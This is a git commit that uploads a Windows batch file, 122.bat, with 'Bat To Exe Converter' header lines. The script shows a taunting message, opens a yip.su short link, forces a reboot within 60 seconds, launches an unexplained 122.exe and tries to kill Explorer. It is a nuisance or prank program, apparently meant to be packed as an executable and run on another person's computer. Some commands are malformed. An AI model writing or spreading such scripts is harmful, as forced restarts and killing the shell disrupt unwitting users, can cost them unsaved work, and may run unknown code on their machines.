a158bac17a3ca63e51b44abcb2f1c7c3cea8cd21
redcat607oficcial <101455968+redcat607oficcial@users.noreply.github.com>
2023-09-20 16:24:40 +0200

    Add files via upload

---
+++ 122.bat
@@ -0,0 +1,41 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAnk
+::fBw5plQjdG8=
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSTk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJhekk0
+::ZQ05rAF9IBncCkqN+0xwdVsFHlbi
+::ZQ05rAF9IAHYFVzEqQJhekk0
+::eg0/rx1wNQPfEVWB+kM9LVsJDFXQbgs=
+::fBEirQZwNQPfEVWB+kM9LVsJDFXQbgs=
+::cRolqwZ3JBvQF1fEqQJhekk0
+::dhA7uBVwLU+EWAjWpiI=
+::YQ03rBFzNR3SWATEpRBiSA==
+::dhAmsQZ3MwfNWATEpRBiSA==
+::ZQ0/vhVqMQ3MEVWAtB9weUkGLA==
+::Zg8zqx1/OA3MEVWAtB9weUkGLA==
+::dhA7pRFwIByZRRnVphBQ
+::Zh4grVQjdCmDJAjWpgw1MB40
+::YB416Ek+ZW8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+msg *he know*
+start https://yip.su/RNwkd.mp4
+do:
+shutdown -t 60 -r -f
+start 122.exe
+taskkill explorer
+start
+loop:
